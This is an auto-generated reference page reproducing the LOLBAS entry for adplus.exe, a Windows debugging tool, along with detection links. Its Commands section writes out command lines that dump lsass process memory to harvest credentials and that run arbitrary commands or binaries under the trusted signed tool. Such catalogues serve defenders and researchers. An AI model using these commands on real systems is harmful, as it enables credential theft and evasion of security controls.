---
parsed_by: focuslocust
source: lolbas
type: generated
---
# adplus.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `adplus.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Adplus.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [adplus.exe](../../tools/windows/adplus.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | adplus.exe |
| name | adplus.exe |
| type | tool |
| source | lolbas |
| url | https://mrd0x.com/adplus-debugging-tool-lsass-dump/ |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@mrd0x'
  Person: mr.d0x
- Handle: '@nas_bench'
  Person: Nasreddine Bencherchali
Author: mr.d0x
Code_Sample:
- Code: https://gist.github.com/nasbench/e34ca2cd90e3a845a558a102a4f607da
Commands:
- Category: Dump
  Command: adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet
  Description: Creates a memory dump of the lsass process
  MitreID: T1003.001
  OperatingSystem: All Windows
  Privileges: SYSTEM
  Usecase: Create memory dump and parse it offline
- Category: Execute
  Command: adplus.exe -c {PATH:.xml}
  Description: Execute arbitrary commands using adplus config file (see Resources section for a sample file).
  MitreID: T1127
  OperatingSystem: All Windows
  Privileges: User
  Tags:
  - Execute: CMD
  Usecase: Run commands under a trusted Microsoft signed binary
- Category: Dump
  Command: adplus.exe -c {PATH:.xml}
  Description: Dump process memory using adplus config file (see Resources section for a sample file).
  MitreID: T1003.001
  OperatingSystem: All Windows
  Privileges: SYSTEM
  Usecase: Run commands under a trusted Microsoft signed binary
- Category: Execute
  Command: adplus.exe -crash -o "{PATH_ABSOLUTE:folder}" -sc {PATH:.exe}
  Description: Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory
    via '-o' is required.
  MitreID: T1127
  OperatingSystem: All windows
  Privileges: User
  Tags:
  - Execute: CMD
  - Execute: EXE
  Usecase: Run commands under a trusted Microsoft signed binary
Created: 2021-09-01
Description: Debugging tool included with Windows Debugging Tools
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_adplus.yml
- IOC: As a Windows SDK binary, execution on a system may be suspicious
Full_Path:
- Path: C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\adplus.exe
- Path: C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\adplus.exe
Name: adplus.exe
Resources:
- Link: https://mrd0x.com/adplus-debugging-tool-lsass-dump/
- Link: https://twitter.com/nas_bench/status/1534916659676422152
- Link: https://twitter.com/nas_bench/status/1534915321856917506
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Adplus.yml
```

## Detection / Analysis Notes

```text
IOC: As a Windows SDK binary, execution on a system may be suspicious
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_adplus.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_adplus.yml
- IOC: As a Windows SDK binary, execution on a system may be suspicious
```
